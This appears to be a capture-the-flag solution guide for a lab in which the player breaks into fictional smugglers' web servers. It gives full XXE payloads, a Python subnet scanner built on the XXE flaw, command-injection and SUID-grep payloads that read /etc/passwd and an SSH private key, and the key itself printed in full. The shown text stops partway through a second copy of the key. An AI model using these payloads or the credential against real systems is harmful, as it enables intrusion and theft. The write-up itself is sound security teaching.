# A Round Orange

_Solution Guide_

This solution guide covers how to gain access to the smugglers' systems on `10.5.5.0/24`, discover any other systems/networks the smugglers might be hiding, retrieve the list of employees who are part of the the smuggling ring, and how shut down their Orange Glory website.

Question 1 has a fixed answer. The answer to Question 2 and Question 3 is generated dynamically. The answer for Question 2 will be a pipe delimited list of five employees. Order won't matter. Here is an example of an answer: `kailee|veronika|zulekha|grigor|bipin`. The answer to Question 3 will be an 16 character hexadecimal token. Here is an example of an answer: `f5006bf76f2a60a9`. 

>To better understand this solution guide, you need moderate knowledge of the following software/skills/topics: XXE Vulnerability, OS Command Injection, Burp Suite, SUID, nmap and Python scripting.

## Question 1

*What is the hostname of the system the smugglers are hiding on a subnet other than 10.5.5.0/24?*

### Scanning the network

1. The first step will be to scan the network to figure out what approach we will take on this challenge. To do this, we figure out our IP address. Run the following command: 
```
ip a
```

For this solution guide, our IP address is `10.5.5.98`, though keep in mind yours might be different. 


2. Once you have your IP address, let's proceed we scanning the network with the command below: 
```
nmap 10.5.5.0/24
```

These were our results:

![img-1](./img/img-1.png)

3. Both `10.5.5.92` and `10.5.5.59` (again, your IPs might be different) are showing up with port 80 open. Let's start there. 

### Looking for a path forward

1. Once you took a look at both websites, you will notice the following `Orange Glory Website`, which seems to focus on selling orange products. Based on this challenge, the list of employee's we are looking for will be on this system's Desktop.  

![img-2](./img/img-2.png)

>SPOILER ALERT: 
>No matter how much the user attempts to exploit this system (`orange-glory`), this is not the way to go as it doesn't present any vulnerabilities. 
>Once the user discovers this, they can head over to the next website at `10.5.5.92` to find another way to reach the goal of this challenge. 

![img-3](./img/img-3.png)

### Finding the first vulnerability

1. Upon exploring the `Space Guide` website at `10.5.5.92`, the user will notice that the `Subscribe` section at the end of the page sends a POST request over to `http://10.5.5.92/submission.php`. This can be easily seen by actually submiting a value or via the source code.

![img-4](./img/img-4.png)

![img-5](./img/img-5.png)

2. Let's look at `http://10.5.5.92/submission.php` source code for any clues. Here's what we found: 

![img-6](./img/img-6.png)

3. You can see it has a comment about validating your input at `10.5.5.92/process_xml.php` 

4. Based on this, let's attempt an XXE attack. In this solution guide, we will be using BurpSuite Community to make things easier. Once you open BurpSuite, just click `OK -> I Accept -> Next -> Start Burp` until Burp is completely open like below.

![img-7](./img/img-7.png)

5. Click on `Target` and then on `Open Browser` and provide a temporary password. Chromium should open and you can access `http://10.5.5.92` again. 

![img-8](./img/img-8.png)

![img-9](./img/img-9.png)

6. In order for us to capture the `POST` request in BurpSuite, lets send another test submission under the `Subscribe` section. Just type whatever you want and hit `Subscribe`. 

![img-10](./img/img-10.png)

7. Now, go back to `BurpSuite`, then click on `Proxy` -> `HTTP history` and search for the POST request you just made. In our case, is the last thing on our list. 

![img-11](./img/img-11.png)


8. Right-click the POST request and click on `Send to Repeater`.

9. You can then click on `Repeater` at the top. Here is what you will see:

![img-12](./img/img-12.png)

### Developing the payload

1. Now, using `BurpSuite Repeater`, let's do a few modifications to the `Request` so that we can communicate with the hint we saw before (`process_xml.php`)

2. First, change the first line from: 
```
POST /submission.php HTTP/1.1
```
to
```
POST /process_xml.php HTTP/1.1
```

3. Then, remove the last line. The last line should  look something like this:
```
email=whatever+you+want&submit=submit
```

4. Now, let's create the payload. Here is what we are using:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "whoami" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

5. The important part of our payload is the following:
- First, you will notice that we are trying to perform a command, in this case: `whoami`. 
- Also, we are using the word `email` as an input since that's what the `Subscribe` section was using. 

6. Here is how your `Request` should look like (some sections can be different on your `Request`): 

![img-13](./img/img-13.png)

7. If you click on `Send`, you'll notice you don't receive anything interesting.  

![img-14](./img/img-14.png)

This might mean that we don't have access to executing commands but, we might have access to read resources. Let's try that.

8. Change your payload to this instead:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
<entry>
	<email>&xxe;</email>
</entry>
```
Notice that we changed `whoami` to the following: `php://filter/convert.base64-encode/resource=/etc/password`. The main reason is that we prefer to encode the data to make sure we are not losing anything valuable.

9. Click `Send` and now you should receive a large base64 encoded string. 

![img-15](./img/img-15.png)

 10. Now, you can either copy that string and do the following command in your terminal:

 ```
echo "<your-string-goes-here>" | base64 -d
 ```

or just use BurpSuite to decode it. It should be as easy as to highlight what you want to be decoded and BurpSuite will do it for you. Take a look this example:

![img-16](./img/img-16.png)

11. Now that you know that you can read files in that system, there's only a handful of things you can do, so, feel free to explore them. We will go straight to the point to what you need to do to solve this challenge. 

12. First, you will need to figure out if this system has any other IP addresses. A file that contains this information is `/proc/net/fib_trie`. Let's insert that into our payload and hit `Send` again. 
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/proc/net/fib_trie" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

![img-17](./img/img-17.png)

13. This file tells us the IP of this website, `10.5.5.92` and also another IP, `10.10.10.10`. Write that down. So far, you have found that the `space-guide` system has two NICs, one with IP `10.5.5.92` and the other one with a `10.10.10.10.` IP address. Since all we can do on this system is read files, we can create a script to see if, by any chance there is another website being ran on the `10.10.10.0/24` subnet with port 80. We are doing this because the challenge documentation lets us know that the smugglers' use web services to cover their tracks and, it also tells us to see if there are any other systems/networks. Here is a python script you can use: 

```
#!/usr/bin/python

import requests
import base64

def build_xml(string):
    xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
    xml = xml + '\r\n' + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
    xml = xml + '\r\n' + """<!ENTITY xxe SYSTEM """ + '"' + string \
        + '"' + """>]>"""
    xml = xml + '\r\n' + """<xml>"""
    xml = xml + '\r\n' + """    <email>&xxe;</email>"""
    xml = xml + '\r\n' + """</xml>"""
    send_xml(xml)


def send_xml(xml):
    headers = {'Content-Type': 'application/xml'}
    x = requests.post('http://10.5.5.92/process_xml.php',
                      data=xml, headers=headers, timeout=5).text
    print(x)

for i in range(1, 255):
    try:
        i = str(i)
        ip = '10.10.10.' + i
        string = 'php://filter/convert.base64-encode/resource=http://' \
            + ip + '/'
        print(string)
        build_xml(string)
    except:
        continue


```

This script above will try to access a website in the `10.10.10.0/24` subnet, if any, and then show us the base64 encoded source code of it. We saved it on our Desktop as `scan.py`. Run the script.

14. After a few minutes of running the script, we notice we receive a base64 encoded value on IP `10.10.10.175`.

![img-18](./img/img-18.png)

15. Let's decode this one using the terminal: 

```
echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJtYWluLmNzcyI+CiAgICA8dGl0bGU+U3BhY2UgVGlwczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CiAgICAgICAgIDwhLS0gU3RhcnQgaGVhZGVyIC0tPgogICAgICAgICA8ZGl2IGlkPSJoZWFkZXIiPgogICAgICAgICAgICA8dWwgaWQ9Im5hdiI+CiAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iIj5Ib21lPC9hPgogICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L2Rpdj4KICAgICAgICA8IS0tIEVuZCBoZWFkZXIgLS0+CiAgICAgICAgPCEtLSBCb2R5IC0tPgogICAgICAgIDxkaXYgY2xhc3M9InRleHQiPgogICAgICAgICAgICA8aDE+SnVzdCBhIGZldyBtb3JlIGRheXMhPC9oMT4KICAgICAgICAgICAgPHA+VGhpcyB3ZWJzaXRlIGlzIHVuZGVyIGNvbnN0cnVjdGlvbi4gT3VyIHB1cnBvc2Ugd2lsbCBiZSB0byBjcmVhdGUgYSBwbGF0Zm9ybSB3aGVyZSBldmVyeW9uZSBjYW4gYWRkIHRpcHMgdG8gbWFrZSB5b3VyIHRpbWUgaW4gc3BhY2UgYSBsaXR0bGUgYml0IGVhc2llci48L3A+CgkgICAgPHA+Q29tZSBiYWNrIHRvIHRoaXMgcGFnZSBpbiB0aGUgbmV4dCBmb2xsb3dpbmcgZGF5cyB0byBzZWUgb3VyIHByb2dyZXNzLjwvcD4KICAgICAgICAgICAgPHA+V2UgY3VycmVudHkgaGF2ZSAzIHRpcHMgYXZhaWxhYmxlIGZvciBkZW1vbnN0cmF0aW9uIHB1cnBvc2VzISBKdXN0IHR5cGU6IFRpcC0xLCBUaXAtMiBvciBUaXAtMyBhbmQgaGl0IHRoZSA8Yj5SZWFkIFRpcDwvYj4gYnV0dG9uLjwvcD48YnI+CgkJPGRpdj4KCQk8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJHRVQiPgogICAgCQkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InRpcHMiPgoJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUmVhZCBUaXAiPgoJCTwvZm9ybT4KCgkJPC9kaXY+CiAgICAgICAgPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=" | base64 -d
```

and this is what we get once decoded: 

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="main.css">
    <title>Space Tips</title>
</head>
<body>
         <!-- Start header -->
         <div id="header">
            <ul id="nav">
                <li>
                    <a href="">Home</a>
                </li>
            </ul>
        </div>
        <!-- End header -->
        <!-- Body -->
        <div class="text">
            <h1>Just a few more days!</h1>
            <p>This website is under construction. Our purpose will be to create a platform where everyone can add tips to make your time in space a little bit easier.</p>
            <p>Come back to this page in the next following days to see our progress.</p>
            <p>We currenty have 3 tips available for demonstration purposes! Just type: Tip-1, Tip-2 or Tip-3 and hit the <b>Read Tip</b> button.</p><br>
                <div>
                <form action="index.php" method="GET">
                        <input type="text" name="tips">
                        <input type="submit" value="Read Tip">
                </form>

                </div>
        </div>
</body>
</html>

```

16. If you play close attention to this output, you will notice that it is a website related to `Space Tips` and that it also has another `form` near the bottom and that the submitted input is saved with the parameter `tips`. First, let's try using the website as intended but, through the URL. Here is the first payload we are going to use: 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

And here is what we got:

![img-19](./img/img-19.png)


Based on this, you will notice that it returns an output for `Tip-1`. This might mean that this website is performing a `cat` command (or similar) and looking for a file called `Tip-1`. We can attempt to send a command injection using a payload through the URL and appending our desired command and see if that works. Let's try that. Here is the payload we are going to use: 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;whoami" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

![img-20](./img/img-20.png)

There we go! We can perform command injection in this system and, you have `www-data` access! 

### Using command injection on the system 

1. Now, let's try to find the IPs of this system reading the same file we read before `/proc/net/fib_trie`. Here is the payload you will use for that on BurpSuite: 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;cat /proc/net/fib_trie" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

![img-21](./img/img-21.png)

2. We didn't receive anything. We might need to encode the URL before sending it. BurpSuite does this for us. 

Highlight the part of the URL you want to encode. In this case, we are going to only encode `cat /proc/net/fib_trie`. Once highlighted, do a `right-click` and click on `Convert Selection` -> `URL` -> `URL-encode all characters`. Once encoded, click `Send`. 

![img-22](./img/img-22.png)

![img-23](./img/img-23.png)


3. You also have an IP with a `20.20.20.0/24` subnet, specifically, the IP `20.20.20.20`. Write this down. You now have access to the following: 
- `space-guide` system with two networks, `10.5.5.59` and `10.10.10.10`. This system has an XXE vulnerability that is allowing you to read files/resources.
- Another system with two networks, `10.10.10.175` that contains a website vulnerable to command injection and `20.20.20.20`. 
Let's continue.

4. We are going to use the same python script we used before but, with a few modifications. Since we can execute commands on this system, we can try to send some `ping` commands to the `20.20.20.0/24` subnet to see if there's any IP we can reach. Here is the modified python script:

```
#!/usr/bin/python

import requests
import base64


def build_xml(string):
    xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
    xml = xml + '\r\n' + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
    xml = xml + '\r\n' + """<!ENTITY xxe SYSTEM """ + '"' + string \
        + '"' + """>]>"""
    xml = xml + '\r\n' + """<xml>"""
    xml = xml + '\r\n' + """    <email>&xxe;</email>"""
    xml = xml + '\r\n' + """</xml>"""
    send_xml(xml)


def send_xml(xml):
    headers = {'Content-Type': 'application/xml'}
    x = requests.post('http://10.5.5.92/process_xml.php',
                      data=xml, headers=headers, timeout=5).text
    coded_string = x.split(' ')[-4]  # a little split to get only the base64 encoded value....
    print(base64.b64decode(coded_string))

for i in range(48, 55):
    try:
        i = str(i)
        ip = i
        string = 'php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;%70%69%6e%67%20%2d%63%20%32%20%32%30%2e%32%30%2e%32%30%2e' \
            + ip + '%20%32%3e%26%31'
        print(string)
        build_xml(string)
    except:
        continue
```

> **Note:** Notice that we added `2>&1` right after the command (It is currently encoded but, it is there). This will allow us to redirect the output to, in this case, the terminal and, in upcoming commands, to BurpSuite. 

5. We are going to use this step to give you a brief explanation on what is going on so far. If you understand what we are doing so far, you can skip to step `6` 

Brief explanation of what the python script is doing: 

- We first import what we need.
- Then, the script is preparing the xml payload.
- Next, we prepare a `for` loop that will iterate the last octet of the `20.20.20.x` IP from 1 to 255 and send the following payload: 
```
http://10.10.10.175/index.php?tips=Tip-1;ping -c 2 20.20.20.' + ip  + '2>&1'
```
- What that payload does is simply the following: 
```
ping -c 2 20.20.20.x 2>&1
```

Brief explanation of what is happening throughout the challenge so far:

- We are exploiting an XXE vulnerability on the `10.5.5.59` that allows you to read files on that system.
- We are using that vulnerability to our advantage to develop a scanner that will let us know if there is another web hosted on the `10.10.10.0/24` network. 
- That python script lets you know that there is another website hosted at `10.10.10.175` and upon exploring it, you will notice that you can perform command injection.
- Now, remember, you read the `fib_trie` file and there were only two networks on the `space-guide`. This means that this website you found is hosted somewhere else.
- In theory, what this means is, that by having read access on the `10.5.5.59` system (`space-guide`), you found a way to perform commands in the `10.10.10.175` unknown new system. 
- You also noticed that the `space-guide` system has two networks, `10.5.5.59` and `10.10.10.10` and that the new, unknown system, also has two networks, `10.10.10.175` and `20.20.20.20`. 

Let's continue...

6. We saved the script as `ping.py`. Now, to make things easier, we are running the script with a `grep` like below so that we can only see which IP returned bytes back to us: 

```
python3 ping.py | grep "bytes from 20.20.20"
```

7. After waiting a while, IP `20.20.20.53` replies back. 

![img-24](./img/img-24.png)

8. Now, the first question of this challenge is to figure out the hostname of the hidden smugglers' system. Let's create a payload to get the hostname of this system. 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;hostnamectl" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

This is what we received: 

![img-25](./img/img-25.png)

You now have the answer to Question 1! Way to go!

## Question 2

*One of the smugglers keeps a list of involved personnel on their desktop. What five employees are behind the illegal orange smuggling ring?*

### SUID Vulnerability

1. The second question asks you to find the list five employees are behind the illegal orange smuggling ring. It also tells us it will be found on the Desktop. Let's now create a payload to see if this system contains that file! 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;ls%20-la%20/home/user/Desktop/" >]>
<entry>
	<email>&xxe;</email>
</entry>
```
![img-26](./img/img-26.png)

2. Bingo! There's the file we need. Let's read the contents. Here is the payload: 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;cat%20/home/user/Desktop/employee_list.txt" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

It seems we don't have access to read this file. Let's see what can we do. 

![img-27](./img/img-27.png)


3. Once again, feel free to explore different commands you want but, for this solution guide, we will go straight to the point. There's two things you should've notice in the steps above. First, you couldn't read the contents of `employee_list.txt` and, you found that the only IP that returned a value was `20.20.20.53`. We must find a way to escalate our privileges to be able to perform more useful commands. Let's look for a way to exploit this. Let's see if we can find any other vulnerabilities on the system we currently are (`space-tips`). 

4. The other vulnerability that can be found in this system is an SUID given to the `grep` command. You can find this by doing the following payload back in BurpSuite: 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;find%20/%20-perm%20-u=s%20-type%20f%202%3E/dev/null" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

5. The payload above is executing the command below in the system, which is searching the system for any files with SUID permissions.

```
find / -perm -u=s -type f 2>/dev/null
```

6. It will take a few seconds but, once it is finished, this is the output you will receive: 

![img-28](./img/img-28.png)

7. As you can see on the right, `grep` has SUID permissions. 

8. Since we discovered earlier that we are `www-data`, we can try seeing if there is any other user in the system that we can perform some privilege escalation or something similar. You can change your payload to: 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

The payload above is doing the following: 
```
cat /etc/passwd
```

9. Once you hit `Send`, you will notice that there's a user called `user`. 

![img-29](./img/img-29.png)

10. Let's use the `grep` SUID vulnerability to see if we can read the `employee_list.txt` file. 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;%2f%75%73%72%2f%62%69%6e%2f%67%72%65%70%20%27%27%20%2f%68%6f%6d%65%2f%75%73%65%72%2f%44%65%73%6b%74%6f%70%2f%65%6d%70%6c%6f%79%65%65%5f%6c%69%73%74%2e%74%78%74" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

The payload above is doing the following: 

```
/usr/bin/grep '' /home/user/Desktop/employee_list.txt
```

11. Congrats! You have obtained the requested employees list. Write down that answer. Remember that the required format is pipe delimited as shown below: 

>The list of the employees you obtain might be different.

```
polyiak|yinoiak|baalrat|tylroat|ginyt
```

![img-30](./img/img-30.png)

## Question 3

*Shut down the Orange Glory website and retrieve your token at https://challenge.us*.

1. Now, since we know that using this vulnerability, we can read files that we don't have permissions to, we can attempt to see if there are any SSH keys on the `/home/user/.ssh/` directory. We will try the following payload: 

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;%2f%75%73%72%2f%62%69%6e%2f%67%72%65%70%20%27%27%20%2f%68%6f%6d%65%2f%75%73%65%72%2f%2e%73%73%68%2f%69%64%5f%72%73%61" >]>
<entry>
	<email>&xxe;</email>
</entry>

```
The payload above is doing the following: 
```
/usr/bin/grep '' /home/user/.ssh/id_rsa
```

Here are our results: 

![img-31](./img/img-31.png)

2. We just found a SSH key! Let's copy this value and attempt to use it to connect to the IP we found above. What we will do is `echo` it to a file called `id_rsa` in our current directory. We are going to perform three **indiviual** payloads to avoid writing the SSH key with a wrong format. Here is what we will do: 

```
echo "-----BEGIN OPENSSH PRIVATE KEY-----" > id_rsa
```

```
echo "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtELqH0W+S0X7ThpwZiVQNlrTUE27noBTk2jMOF01+xmjGM0ri0DB
LBJrdfPZoop/Ely09pCQZEbSUbm9Gb7398X4uYnW/5K/qVQJ2AIHF7nU+EVd+h/NBzNnc9
QKLjJDzpu93BNFLI4pwXH6AwiGsoK1cK8RvzFY8kixkjkg+89oZJ5fs47qfSUgy6vSd2/5
kTJHUEhXuslMUzirMZNH03MCmN5b+9ycc64qpvlJVMNBo24laP0qp0yT6b2mBIC4Bvc+Q4
EvddTZDWdTJxpypiQGOC8xfdbGx8XC0cylHijxlHcCgwwvkkZ7vYyDuGhjEuAf9etLugFm
tfVuJkspsQ4cW31rCF2ZMWcROCpJOMVZaUSpz7fLmVkcKCr/+luKkSIVzGwLmpvBx+eY5f
kGYlFMxLqSeibOvy2N2vMxuzJPEYa/+rpGr66PsX6eI/Cpmg4c5UKRvzFjz84Mn/zF8pk5
aX4fZfFvWwi0XZHkzfDmm/b849lPDL2dilMiEgPJAAAFgHmfgD15n4A9AAAAB3NzaC1yc2
EAAAGBALRC6h9FvktF+04acGYlUDZa01BNu56AU5NozDhdNfsZoxjNK4tAwSwSa3Xz2aKK
fxJctPaQkGRG0lG5vRm+9/fF+LmJ1v+Sv6lUCdgCBxe51PhFXfofzQczZ3PUCi4yQ86bvd
wTRSyOKcFx+gMIhrKCtXCvEb8xWPJIsZI5IPvPaGSeX7OO6n0lIMur0ndv+ZEyR1BIV7rJ
TFM4qzGTR9NzApjeW/vcnHOuKqb5SVTDQaNuJWj9KqdMk+m9pgSAuAb3PkOBL3XU2Q1nUy
cacqYkBjgvMX3WxsfFwtHMpR4o8ZR3AoMML5JGe72Mg7hoYxLgH/XrS7oBZrX1biZLKbEO
HFt9awhdmTFnETgqSTjFWWlEqc+3y5lZHCgq//pbipEiFcxsC5qbwcfnmOX5BmJRTMS6kn
omzr8tjdrzMbsyTxGGv/q6Rq+uj7F+niPwqZoOHOVCkb8xY8/ODJ/8xfKZOWl+H2Xxb1sI
tF2R5M3w5pv2/OPZTwy9nYpTIhIDyQAAAAMBAAEAAAGAektDZv/8ADl0KyLIyqPZ7WZlIn
/6H6hUCxf4JO0n6DkWa4cWWZ0O8QV2HknXhuyLFTwMEZM2QrHBkmx+nG7w8ApBmi6nzDAV
E53OJ9wIT9JlaCI3ha/5ez8mmnBqj7jOQ+dpQVtZfMbeET1wLoqkR4th6Rb85UdnXshuoB
NeCzhFTK4do0X8U/bSbxsc6KbxG86OjyrlSfWzcGprynBvNEc8pdWFdjPPeLPaf/l0BKuL
ZoMdokLPozzSxKtDbJ6eFpU0qGLxuQhBT7X4NxQ7Fq9Ie/SwABvMaq6j9+fHP7fAi3/1to
b4/0UP7ZT+FbewersX1Uxt4HFqstjYB1qIR0oqNMf5+nxebggH8BJH2FTWVbciJxv1VcSi
lXx0KNV/JWPYm+hNUk9sD8TjhnS/okZexYA4azLlu10tg3l2WYrUtG4qhGYzVZO7EHSYv4
pIfUI97CAvAiXb1nyVlrr19pMFWZjIR/9ht3hDQsCmNEMKyYyTAM2PE5U7hH/yJ6m5AAAA
wBgYxV1hWXcIgSW4Sm/iwR6F9Zvfbl4yYipI+a0IxU/2pEFNONbTzX9t8VhQ/gMgTVbwNL
ih6EGctNGRh8gEzkt0PXSFT8EZsg94/eD4KPYizlhrgvZtgkQh79euVWSGhAYm/ABvwEwB
u5Qth4Ez2Jd1skqwls/Ayht7mIrqQmpv3Iz0/vPWwFOhoqd8hJ6U2IwnF8EZjgCSSDGdP/
/v0YSLVFJ+D46ERZyhXKbVf0NrU4F+hnhjZjzKeMRBdQfCfgAAAMEA6l98n0fUNL+D3hEf
4BU4u4pET7NvPOJ+/vOrhAW5I/LdqBEHOShaesomPLqMzttLYl2RrTAsFBus2WH/liZgYd
XiB1soXRn5lXQWfDZCDAzBHMppmllSGP4ip9dzhc8nmFNBoa/+E+hALFhgT8mnDIsYsXmo
ant39nHmwG+v/3CT7naemuoRo7S20ejsFP30wd5WnKv14DxWyTw6YBqKhrJ5449gG2s2Dk
G1v4aCnSmD5MlLLSU2kw0mU17Z3MyDAAAAwQDE5SrrCOv9+K4qPVDaxclh1FdiEX6VmAzV
hxNcxYiFdjqYvFcq6NJB7mkiIoRaPh5R6bsicMjc0ZFBshqgNFt81G0kETmF5/GV2tTqt1
qFHwtG/87KmN3t4QYiDg4Q1ovVy5TYSkvPSlJu+kjFB0CGfAylpM+xtQeXQeUTcvi6ct8s
Tg4VJ42ut7u3FjxP5pp/8INsN21Yumcb6rVoQ+b1VSWvSKkbnL/sEhgbUlMidT1m7lU/id
K1SqDST/D4FMMAAAAKdXNlckBib3gtMgE=" >> id_rsa
```

```
echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa
```

Remember to encode each of the values on your three payloads. Also, remember to write `>>` to avoid overwriting the file on the last two payloads. Here are the three **decoded** examples (*REMEMBER TO ENCODE THEM!*):

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;echo "-----BEGIN OPENSSH PRIVATE KEY-----" > id_rsa" >]>
<entry>
	<email>&xxe;</email>
</entry>
```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.10.10.175/index.php?tips=Tip-1;echo "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtELqH0W+S0X7ThpwZiVQNlrTUE27noBTk2jMOF01+xmjGM0ri0DB
LBJrdfPZoop/Ely09pCQZEbSUbm9Gb7398X4uYnW/5K/qVQJ2AIHF7nU+EVd+h/NBzNnc9
QKLjJDzpu93BNFLI4pwXH6AwiGsoK1cK8RvzFY8kixkjkg+89oZJ5fs47qfSUgy6vSd2/5
kTJHUEhXuslMUzirMZNH03MCmN5b+9ycc64qpvlJVMNBo24laP0qp0yT6b2mBIC4Bvc+Q4
EvddTZDWdTJxpypiQGOC8xfdbGx8XC0cylHijxlHcCgwwvkkZ7vYyDuGhjEuAf9etLugFm
tfVuJkspsQ4cW31rCF2ZMWcROCpJOMVZaUSpz7fLmVkcKCr/+luKkSIVzGwLmpvBx+eY5f
kGYlFMxLqSeibOvy2N2vMxuzJPEYa/+rpGr66PsX6eI/Cpmg4c5UKRvzFjz84Mn/zF8pk5
aX4fZfFvWwi0XZHkzfDmm/b849lPDL2dilMiEgPJAAAFgHmfgD15n4A9AAAAB3NzaC1yc2
EAAAGBALRC6h9FvktF+04acGYlUDZa01BNu56AU5NozDhdNfsZoxjNK4tAwSwSa3Xz2aKK
fxJctPaQkGRG0lG5vRm+9/fF+LmJ1v+Sv6lUCdgCBxe51PhFXfofzQczZ3PUCi4yQ86bvd
wTRSyOKcFx+gMIhrKCtXCvEb8xWPJIsZI5IPvPaGSeX7OO6n0lIMur0ndv+ZEyR1BIV7rJ
TFM4qzGTR9NzApjeW/vcnHOuKqb5SVTDQaNuJWj9KqdMk+m9pgSAuAb3PkOBL3XU2Q1nUy
cacqYkBjgvMX3WxsfFwtHMpR4o8ZR3AoMML5JGe72Mg7hoYxLgH/XrS7oBZrX1biZLKbEO
HFt9awhdmTFnETgqSTjFWWlEqc+3y5lZHCgq//pbipEiFcxsC5qbwcfnmOX5BmJRTMS6kn
omzr8tjdrzMbsyTxGGv/q6Rq+uj7F+niPwqZoOHOVCkb8xY8/ODJ/8xfKZOWl+H2Xxb1sI
tF2R5M3w5pv2/OPZTwy9nYpTIhIDyQAAAAMBAAEAAAGAektDZv/8ADl0KyLIyqPZ7WZlIn
/6H6hUCxf4JO0n6DkWa4cWWZ0O8QV2HknXhuyLFTwMEZM2QrHBkmx+nG7w8ApBmi6nzDAV
E53OJ9wIT9JlaCI3ha/5ez8mmnBqj7jOQ+dpQVtZfMbeET1wLoqkR4th6Rb85UdnXshuoB
NeCzhFTK4do0X8U/bSbxsc6KbxG86OjyrlSfWzcGprynBvNEc8pdWFdjPPeLPaf/l0BKuL
ZoMdokLPozzSxKtDbJ6eFpU0qGLxuQhBT7X4NxQ7Fq9Ie/SwABvMaq6j9+fHP7fAi3/1to
b4/0UP7ZT+FbewersX1Uxt4HFqstjYB1qIR0oqNMf5+nxebggH8BJH2FTWVbciJxv1VcSi
lXx0KNV/JWPYm+hNUk9sD8TjhnS/okZexYA4azLlu10tg3l2WYrUtG4qhGYzVZO7EHSYv4
